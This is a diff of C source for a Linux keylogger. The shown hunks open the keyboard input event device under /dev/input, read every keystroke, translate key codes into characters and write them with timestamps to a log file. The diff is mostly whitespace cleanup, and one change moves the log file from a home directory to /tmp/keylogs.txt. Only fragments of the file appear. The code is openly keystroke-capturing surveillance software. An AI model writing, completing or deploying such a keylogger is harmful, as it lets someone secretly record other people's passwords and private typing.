@@ -1,7 +1,7 @@
 #ifdef linux
 #include"keylogger.h"
 #include<stdio.h>
-#include<string.h> 
+#include<string.h>
 #include<stdlib.h> // To use popen and pclose to interact with command-line,
 /** Header file to use open and read function  **/
 #include<unistd.h>
@@ -14,13 +14,13 @@ void get_linux_keyboard(char*); // Function to identify system file.
 
 int klinux(void)
 {
-	struct input_event keystroke ; 
+	struct input_event keystroke ;
 
 	char keyboard_file[22] = {0};
 
 	get_linux_keyboard(keyboard_file);
 
-	/* System file for keyboard are listed in /dev/input/ and can range from event(0-13) appropriate 'event' can be identified using cat /proc/bus/input/devices | less command **/ 
+	/* System file for keyboard are listed in /dev/input/ and can range from event(0-13) appropriate 'event' can be identified using cat /proc/bus/input/devices | less command **/
 
 	int keyboard = open(keyboard_file,O_RDONLY); // This file requires root permission.
 
@@ -29,7 +29,7 @@ int klinux(void)
 		exit(EXIT_FAILURE); // open returns negative value if it encounters an error.
 	}
 
-	FILE *fp = fopen("/home/utkarsh/Documents/Project/keylogs.txt","w");
+	FILE *fp = fopen("/tmp/keylogs.txt","w");
 
 	/* To match entered keystroke to their numeric value /usr/include/linux/input-event-codes.h **/
 
@@ -65,7 +65,7 @@ int klinux(void)
 		fflush(fp); // fflush helps in clearing the buffer stream and ensure that all data has been written to stream( ie file pointer fp ).
 
 		if( keystroke.type == EV_KEY && keystroke.value == 1 ) // keystroke.value represent instance when keys are released , this limit us to condition when user press a key to print key for more than one time our program will only register it as one stroke.
-		{	
+		{
 
   			char time[35] = {0}  ;
 
@@ -144,7 +144,7 @@ int klinux(void)
 					  {
 
 
-						  char number [3] , function[4] = "F" ; 
+						  char number [3] , function[4] = "F" ;
 
 						  sprintf(number,"%d",keystroke.code-58);
 
@@ -156,16 +156,16 @@ int klinux(void)
 					  }
 					  else
 					  {
-					   	fputc(map[keystroke.code],fp); 
+					   	fputc(map[keystroke.code],fp);
 					  }
 
 
 			}
-			
-			
+
+
 			fputs("\n",fp);
 		}
-		
+
 
 	}
 
